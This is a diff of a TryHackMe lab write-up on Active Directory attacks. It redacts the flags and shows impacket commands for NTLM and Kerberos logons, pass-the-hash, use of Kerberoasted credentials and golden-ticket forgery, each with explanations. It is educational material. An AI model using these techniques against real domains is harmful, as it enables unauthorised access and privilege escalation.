@@ -114,7 +114,7 @@ smbclient.py thm.loc/claire:'Password123!'@192.168.11.51
 ```
 # use SHARE1
 # cat flag1.txt
-THM{5cbcc61a-3178-4220-88b4-367c1bbb48e7}
+THM{5cbcc61a-3178-???c1bbb48e7}
 ```
 
 **Note:** Connection by IP address (not hostname) → Kerberos cannot work → automatic fallback to NTLM. The client never contacts the DC directly; the target server proxies the authentication.
@@ -140,7 +140,7 @@ smbclient.py thm.loc/mary@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11.100
 ```
 # use SHARE2
 # cat flag2.txt
-THM{0d3f818a-427a-425c-a451-55e43b83e876}
+THM{0d3f818a-427a-???-55e43b83e876}
 ```
 
 **Key differences from NTLM:** Connection by hostname (required for Kerberos SPN resolution). Password needed only once to obtain TGT. `-dc-ip` specified because the attack machine is not domain-joined and cannot find the DC via DNS SRV records.
@@ -167,7 +167,7 @@ smbclient.py "thm.loc/phillip:secret12!"@192.168.11.51
 ```
 # use SHARE3
 # cat flag3.txt
-THM{0eef8df3-c8ea-41ad-acd7-ae0479b2badf}
+THM{0eef8df3-c???-ae0479b2badf}
 ```
 
 **Alternative approach — Pass-the-Hash (no cracking needed):**
@@ -189,7 +189,7 @@ smbclient.py thm.loc/ben@192.168.11.51 -hashes aad3b435b51404eeaad3b435b51404ee:
 ```
 # use SHARE4
 # cat flag4.txt
-THM{284c6735-b7c1-4221-b072-abf30a54eeda}
+THM{284c6735-b7c1-???-abf30a54eeda}
 ```
 
 **Hash format:** `LM_HASH:NTLM_HASH`. The LM hash `aad3b435b51404eeaad3b435b51404ee` is the hash of an empty string — LM hashing is disabled on modern systems, so this is always a placeholder. Only the NTLM part (after the colon) matters. Both formats work: `-hashes :NTLM_ONLY` or `-hashes LM_PLACEHOLDER:NTLM`.
@@ -229,7 +229,7 @@ smbclient.py "thm.loc/svc_printer:password1!"@192.168.11.51
 ```
 # use SHARE5
 # cat flag5.txt
-THM{5b57e69d-7089-4282-ba04-c72de9bfdb38}
+THM{5b57e69d-7089???-c72de9bfdb38}
 ```
 
 **Why this works:** Any authenticated domain user can request a Service Ticket for any SPN — this is by design, not a vulnerability. The ticket is encrypted with the service account's hash, enabling offline brute force. Service accounts frequently have weak, never-rotated passwords. The value isn't access to the service itself — it's gaining another domain credential that may have elevated privileges elsewhere.
@@ -259,7 +259,7 @@ smbclient.py thm.loc/Administrator@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11
 ```
 # use SHARE6
 # cat flag6.txt
-THM{eac75729-86ea-4bab-98de-1c5ce3552f67}
+THM{eac75729-86ea-???e-1c5ce3552f67}
 ```
 
 **What happened:** `ticketer.py` used the krbtgt hash to create a completely forged TGT for Administrator. The DC trusts this ticket because it's signed with the correct key. No password was stolen, no ticket was intercepted — the TGT was manufactured from scratch.
